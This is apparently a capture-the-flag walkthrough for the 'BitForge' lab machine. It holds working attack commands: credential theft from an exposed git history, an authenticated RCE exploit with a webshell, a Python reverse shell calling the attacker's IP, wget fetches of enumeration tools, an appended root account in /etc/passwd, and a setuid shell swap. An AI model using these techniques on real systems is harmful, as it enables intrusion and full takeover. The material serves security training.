# BitForge

## Initial access

Ran an automated enumeration scan against the target host.

```
sudo autorecon 192.168.236.186
```

The scan revealed three open ports:

- **22** — SSH (OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0))
- **80** — HTTP (Apache httpd)
  - Additional webpages discovered:
    - `http://192.168.236.186/.git/`
    - `http://192.168.236.186/static/`
    - `http://192.168.236.186/login.php`
- **3306** — MySQL (MySQL 8.0.40-0ubuntu0.24.04.1)

Navigated to the web server at `http://192.168.236.186`, which redirected to `http://bitforge.lab/`. Added the hostname to `/etc/hosts`:

```
192.168.236.186 bitforge.lab
```

The site contained a link to `http://plan.bitforge.lab/`. Added this subdomain to `/etc/hosts` as well:

```
192.168.236.186 bitforge.lab plan.bitforge.lab
```

Nothing else of interest was found on the main site.

Navigated to `http://plan.bitforge.lab/`, which redirected to `http://plan.bitforge.lab/www/index.php`. The page displayed a login form and appeared to be running **Simple Online Planning v1.52.01**. Tried default credentials but authentication failed.

Searched for known vulnerabilities against Simple Online Planning:

```
searchsploit simple online planning
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE) (Authenticated)                                                                                                            | php/webapps/52082.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

The application is vulnerable to authenticated remote code execution, requiring valid credentials first.

Explored `http://192.168.236.186/.git/`, which exposed a git repository. Installed [git-dumper](https://github.com/arthaud/git-dumper) and downloaded the entire `.git` folder:

```
git-dumper http://bitforge.lab/.git/ bitforge
```

Examined the git log:

```
cd bitforge

git log
commit 1ce700a508aec3d5e4aa1b128a662f2c85f5ad (HEAD -> main)
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:44:48 2024 +0000

    created .env to store the database configuration

commit eaf6c81951775e4202e40762b3300cc936cf4df1
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:44:05 2024 +0000

    removing db-config due to hard coded credentials

commit 18833b811e967ab8bec631344a6809aa4af59480
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:43:08 2024 +0000

    added the database configuration
...
```

The commit history revealed that a `db-config` file containing hardcoded credentials was removed in a later commit. Checked out the commit containing the database configuration:

```
git checkout 18833b811e967ab8bec631344a6809aa4af59480

cat db-config.php
<?php
// Database configuration
$dbHost = 'localhost'; // Change if your database is hosted elsewhere
$dbName = 'bitforge_customer_db';
$username = 'BitForgeAdmin';
$password = 'B1tForG3S0ftw4r3S0lutions';

try {
    $dsn = "mysql:host=$dbHost;dbname=$dbName;charset=utf8mb4";
    $pdo = new PDO($dsn, $username, $password);

    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    echo "Connected successfully to the database!";
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}
?>
```

Extracted the credentials: `BitForgeAdmin:B1tForG3S0ftw4r3S0lutions`.

Tested the credentials on `http://plan.bitforge.lab/www/index.php`, but authentication failed.

Connected to the MySQL server using the extracted credentials:

```
mysql -u BitForgeAdmin -p'B1tForG3S0ftw4r3S0lutions' -h 192.168.236.186 --skip-ssl-verify-server-cert

MySQL [(none)]> show databases;
+----------------------+
| Database             |
+----------------------+
| bitforge_customer_db |
| information_schema   |
| performance_schema   |
| soplanning           |
+----------------------+

MySQL [(none)]> show tables from soplanning;
+----------------------------+
| Tables_in_soplanning       |
+----------------------------+
| planning_audit             |
| planning_config            |
| planning_ferie             |
| planning_groupe            |
| planning_lieu              |
| planning_periode           |
| planning_projet            |
| planning_projet_user_tarif |
| planning_ressource         |
| planning_right_on_user     |
| planning_status            |
| planning_user              |
| planning_user_groupe       |
+----------------------------+

MySQL [(none)]> select login,password from soplanning.planning_user;
+-------+------------------------------------------+
| login | password                                 |
+-------+------------------------------------------+
| admin | 77ba9273d4bcfa9387ae8652377f4c189e5a47ee |
| NULL  | NULL                                     |
| NULL  | NULL                                     |
| NULL  | NULL                                     |
| NULL  | NULL                                     |
+-------+------------------------------------------+
```

The admin user has a SHA-1 password hash. Attempted to crack it with `hashcat` but was unsuccessful. Since database access is available, updated the admin's password hash directly instead.

Researched SOPlanning's password hashing mechanism: SOPlanning stores user passwords in the `planning_user` table using salted SHA-1 hashing in modern versions, though legacy versions (around v1.32) previously relied on unsalted MD5.

Searched for the default SHA-1 password hash for SOPlanning's admin user (`admin:admin`):

```
The default SHA-1 password hash for SOPlanning's default admin user (admin:admin) is df5b909019c9b1659e86e0d6bf8da81d6fa3499e
```

Updated the admin's password hash in the database to the known default value:

```
MySQL [(none)]> UPDATE soplanning.planning_user SET password = 'df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE login = 'admin';
```

Tested login at `http://plan.bitforge.lab/www/index.php` with credentials `admin:admin`. Authentication succeeded.

Downloaded the authenticated remote code execution exploit (Exploit-DB 52082) and ran it:

```
searchsploit -m 52082

python3 52082.py -t http://plan.bitforge.lab/www -u admin -p admin
[+] Uploaded ===> File 'ahb.php' was added to the task !
[+] Exploit completed.
Access webshell here: http://plan.bitforge.lab/www/upload/files/mwkr1q/ahb.php?cmd=<command>
Do you want an interactive shell? (yes/no) yes
soplaning:~$ whoami
www-data
```

Upgraded the reverse shell using Python and caught it with `penelope` on port 3306 (port 4444 seemed to be blocked):

```
soplaning:~$ export RHOST="192.168.45.208";export RPORT=3306;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

# penelope
www-data@BitForge:/var/www/plan.bitforge.lab/public_html/www/upload/files/hrxk28$ whoami
www-data
```

Seemed like only `python3` reverse shells worked as well.

Searched for `local.txt` but www-data could not access it — the file appears to be in another user's directory:

```
www-data@BitForge:/var/www/plan.bitforge.lab/public_html/www/upload/files/hrxk28$ find / -name local.txt 2>/dev/null
```

Listed users on the target machine:

```
www-data@BitForge:/var/www/plan.bitforge.lab/public_html/www/upload/files/hrxk28$ ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Jan 15  2025 .
drwxr-xr-x 23 root   root   4096 Nov  7  2024 ..
drwxr-x---  2 jack   jack   4096 Jan 16  2025 jack
drwxr-x---  3 ubuntu ubuntu 4096 Nov  7  2024 ubuntu
```

Uploaded `linpeas.sh` for enumeration. Started an HTTP server on the attacker machine and downloaded the script via `wget`:

```
# Host
python3 -m http.server 80

ip a
inet 192.168.45.208/24

# Target
www-data@BitForge:/var/www/plan.bitforge.lab/public_html/www/upload/files/hrxk28$ cd /tmp
www-data@BitForge:/tmp$ which wget
/usr/bin/wget

www-data@BitForge:/tmp$ wget http://192.168.45.208:9001/linux/enum/linpeas.sh
```

Port 9001 seemed to also be blocked, so port 80 was used instead. Ran `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@BitForge:/tmp$ chmod +x linpeas.sh
www-data@BitForge:/tmp$ ./linpeas.sh
```

Nothing of note was found.

Downloaded and ran `pspy64` to watch for hidden processes:

```
www-data@BitForge:/tmp$ wget http://192.168.45.208:9001/linux/enum/pspy64

www-data@BitForge:/tmp$ chmod +x pspy64
www-data@BitForge:/tmp$ ./pspy64
...
2026/11/27 13:19:01 CMD: UID=0     PID=59188  | mysqldump -u jack -pj4cKF0rg3@445 soplanning
```

A cron job running every minute as root executed `mysqldump -u jack -pj4cKF0rg3@445 soplanning`, leaking the plaintext password in the process arguments. Extracted the credentials: `jack:j4cKF0rg3@445`.

Switched to the `jack` user:

```
www-data@BitForge:/tmp$ su jack
Password: j4cKF0rg3@445

jack@BitForge:/tmp$ whoami
jack
```

Retrieved the `local.txt` flag:

```
jack@BitForge:/tmp$ cd ~
jack@BitForge:~$ cat local.txt
e9644760e9c5c003675cb3aaf11bf8af
```

## Privilege escalation

Checked `jack`'s sudo privileges:

```
jack@BitForge:~$ sudo -l
...
User jack may run the following commands on bitforge:
    (root) NOPASSWD: /usr/bin/flask_password_changer
```

Examined the Flask-related files. The binary at `/usr/bin/flask_password_changer` is a bash script that changes directory to `/opt/password_change_app` and runs the Flask application:

```
jack@BitForge:~$ ls -al /usr/bin/flask_password_changer
-rwxr-xr-x 1 root root 106 Jan 16  2025 /usr/bin/flask_password_changer

jack@BitForge:~$ cat /usr/bin/flask_password_changer
#!/bin/bash
cd /opt/password_change_app
/usr/local/bin/flask run --host 127.0.0.1 --port 9000 --no-debug

jack@BitForge:~$ ls -al /opt/password_change_app
total 16
drwxr-xr-x 3 jack jack 4096 Jan 16  2025 .
drwxr-xr-x 4 root root 4096 Jan 16  2025 ..
-rw-r--r-- 1 jack jack  134 Jan 16  2025 app.py
drwxr-xr-x 2 jack jack 4096 Jan 16  2025 templates
```

The `/opt/password_change_app` directory is owned by `jack`, including the `app.py` file, which is writable. Modified `app.py` to add a `/passwd` endpoint that appends a new root user (`pwned`) to `/etc/passwd`:

```
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/passwd")
def passwd():
    with open("/etc/passwd", "a") as passwd_file:
        passwd_file.write("pwned:$1$CbfhPUvy$diJkJjvCHY1wykQSIsqE9/:0:0:root:/root:/bin/bash\n")
    with open("/etc/passwd", "r") as passwd_file:
        passwds = passwd_file.read()
    return passwds

@app.route("/")
def home():
    return render_template("index.html")
```

The password hash for `pwned` was generated using `openssl passwd -1 pwned`, which produced `$1$CbfhPUvy$diJkJjvCHY1wykQSIsqE9/`.

Opened another SSH session as `jack` and accessed the `/passwd` endpoint to verify the new user was added:

```
ssh jack@192.168.236.186
jack@192.168.236.186's password: j4cKF0rg3@445

jack@BitForge:~$ curl http://127.0.0.1:9000/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/bin/false
nobody:x:65534:65534:nobody:/nonexistent
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
jack:x:1001:1001::/home/jack:/bin/bash
pwned:$1$CbfhPUvy$diJkJjvCHY1wykQSIsqE9/:0:0:root:/root:/bin/bash
```

The `pwned` user was added as a root-level account. Switched to `pwned`:

```
jack@BitForge:~$ su pwned
Password: pwned

root@BitForge:/home/jack# whoami
root
```

Retrieved the `proof.txt` flag:

```
root@BitForge:~# cat proof.txt
bb9f88ffbf25f8750f75299a93faa07d
```

### Alternative Privilege Escalation — direct root shell via Flask app modification

The same sudo-permitted Flask application can be abused to obtain a direct root shell without modifying `/etc/passwd`. Since `jack` owns the `app.py` file and can run `/usr/bin/flask_password_changer` as root via sudo with no password, replacing the Flask application with a Python script that spawns a root shell is a simpler approach.

Replaced `app.py` with a script that sets the effective UID to 0 and spawns a root shell:

```
import os
os.setuid(0)
os.system("/bin/bash -p")
```

Then ran the sudo command to start the Flask application, intercepting the process to gain a root shell:

```
jack@BitForge:~$ sudo /usr/bin/flask_password_changer
root@BitForge:/opt/password_change_app# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieved the `proof.txt` flag from `/root/`.

Credit: [Route Zero Security — Proving Grounds: BitForge Walkthrough](https://routezero.io/2025/01/31/proving-grounds-practice-bitforge-walkthrough)
